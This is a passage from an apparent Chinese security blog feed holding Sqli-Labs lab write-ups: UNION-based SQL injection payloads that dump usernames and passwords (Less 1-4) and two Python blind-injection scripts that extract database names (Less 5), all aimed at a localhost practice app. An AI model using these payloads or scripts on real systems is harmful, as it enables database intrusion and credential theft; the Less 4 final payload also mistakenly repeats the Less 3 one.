      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less5-writeup</title>
    <link href="http://yoursite.com/2017/04/02/Sqli-Labs-Less5-writeup/"/>
    <id>http://yoursite.com/2017/04/02/Sqli-Labs-Less5-writeup/</id>
    <published>2017-04-02T13:27:16.000Z</published>
    <updated>2017-04-03T02:45:45.650Z</updated>
    
    <content type="html"><![CDATA[<p>第五关是盲注<br><a id="more"></a></p>
<h1 id="查看是否有注入"><a href="#查看是否有注入" class="headerlink" title="查看是否有注入"></a>查看是否有注入</h1><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic2.jpg" alt=""><br>页面正常，返回：You are in……</p>
<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic3.jpg" alt=""><br>报错。之后的过程要记得闭合单引号。</p>
<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>依次访问如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+</div><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+</div></pre></td></tr></table></figure></p>
<p>页面返回信息不同。同时试着使用UNION SELECT注入，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure></p>
<p>页面返回 You are in……返回通用页面。故考虑盲注。</p>
<h1 id="普通盲注攻击"><a href="#普通盲注攻击" class="headerlink" title="普通盲注攻击"></a>普通盲注攻击</h1><p>这里使用推断攻击技术，通过推断一次一位地逐步提取信息。</p>
<h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。</p>
<h2 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h2><h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char</div></pre></td></tr></table></figure>
<ul>
<li>num1和num2都是整数，char为单个字符。</li>
<li>(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1)  会返回查询到结果（即各数据库名称）的第num1行。</li>
<li>SUBSTRING(*,num2,1)  返回查询后结果的第num2个字母。</li>
<li>SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。</li>
</ul>
<h3 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h3><ul>
<li>通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。</li>
<li>通过变化num1，num2，char，可以获取到最后的数据。</li>
<li>多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。</li>
</ul>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		result = <span class="string">""</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</div><div class="line">				querysql = <span class="string">"AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span>+str(k)+<span class="string">",1),"</span>+str(i)+<span class="string">",1)='"</span>+j</div><div class="line">				recv = sendPayload(querysql)  </div><div class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</div><div class="line">						result += j</div><div class="line">						i += <span class="number">1</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">print</span> result</div><div class="line">						i = <span class="number">0</span></div><div class="line">  					<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic4.jpg" alt=""></p>
<h2 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h2><p>Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。</p>
<h3 id="Condition-1"><a href="#Condition-1" class="headerlink" title="Condition"></a>Condition</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 1 ,1)) &gt; 127</div></pre></td></tr></table></figure>
<p>判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2）</p>
<h3 id="Something-1"><a href="#Something-1" class="headerlink" title="Something"></a>Something</h3><p>在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知</p>
<ul>
<li>搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 11 ,1)) &gt; 0</div><div class="line">+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
<h3 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h3><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic5.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第五关是盲注&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less1-4-writeup</title>
    <link href="http://yoursite.com/2017/04/02/Sqli-Labs-Less1-4-writeup/"/>
    <id>http://yoursite.com/2017/04/02/Sqli-Labs-Less1-4-writeup/</id>
    <published>2017-04-02T09:16:38.000Z</published>
    <updated>2017-04-02T09:17:16.520Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53<br><a id="more"></a></p>
<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h1><p>题目是 GET Error based- Single quotes -String。关注点：基于错误，单引号，字符型注入。</p>
<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=1&apos;</div></pre></td></tr></table></figure>
<p>此时页面会产生报错。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1.jpg" alt=""></p>
<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure>
<p>通过UNION SELECT 或者 ORDER BY 语句可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。</p>
<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+</div></pre></td></tr></table></figure>
<p>利用元数据表INFORMATION_SCHEMA获取数据库信息。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3.jpg" alt=""></p>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/</div><div class="line">?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+</div></pre></td></tr></table></figure>
<p>这里 hex(security)=0x7365637572697479</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_tablename.jpg" alt=""></p>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=</div><div class="line">0&apos;  UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_columnsname.jpg" alt=""></p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=</div><div class="line">0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_data.jpg" alt=""></p>
<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h1><p>题目说是数值型注入。 不需要闭合引号。给出最终payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-2/?id=</div><div class="line">0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure></p>
<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h1><p>题目提示 SINGLE QUOTES WITH TWIST。</p>
<h2 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=1&apos;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less3payload1.jpg" alt=""><br>注意到报错回显中有 )，说明需要闭合。</p>
<h2 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2"></a>payload2</h2><h3 id="类似"><a href="#类似" class="headerlink" title="类似"></a>类似</h3><p>将Less1中的几段payload的前面的 0’ 改为 0’)  即可</p>
<h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=</div><div class="line">0&apos;)  UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h1><p>这题需要闭合双引号。</p>
<h2 id="payload1-2"><a href="#payload1-2" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-4/?id=0&quot;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less4payload1.jpg" alt=""><br>需要闭合 双引号</p>
<h2 id="payload2-2"><a href="#payload2-2" class="headerlink" title="payload2"></a>payload2</h2><h3 id="类似-1"><a href="#类似-1" class="headerlink" title="类似"></a>类似</h3><p>将Less1中的几段payload的前面的 0’ 改为 0”)  即可</p>
<h3 id="最终payload-1"><a href="#最终payload-1" class="headerlink" title="最终payload"></a>最终payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=</div><div class="line">0&apos;)  UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
<h1 id="sqlilab环境搭建"><a href="#sqlilab环境搭建" class="headerlink" title="sqlilab环境搭建"></a>sqlilab环境搭建</h1><h2 id="下载sqlilab"><a href="#下载sqlilab" class="headerlink" title="下载sqlilab"></a>下载sqlilab</h2><p>传送门：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>可以选择下载zip后解压或者自行git clone到本地，</p>
<h2 id="推荐phpstudy"><a href="#推荐phpstudy" class="headerlink" title="推荐phpstudy"></a>推荐phpstudy</h2><p>传送门：<a href="http://www.phpstudy.net/a.php/211.html" target="_blank" rel="external">http://www.phpstudy.net/a.php/211.html</a><br>不懂使用的建议查一查。<br>这里假设phpstudyd 主页为　<a href="http://localhost:20000/" target="_blank" rel="external">http://localhost:20000/</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>将sqlilab解压出来的文件夹（默认名为 sqli-labs-master）拷贝到phpstudy的WWW目录下，打开phpstudy，访问sqlilab页面(  <a href="http://localhost:20000/sqli-labs-master" target="_blank" rel="external">http://localhost:20000/sqli-labs-master</a> )。<br>点选Setup/reset Database for labs完成数据库配置。之后即可开始实验。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
</feed>
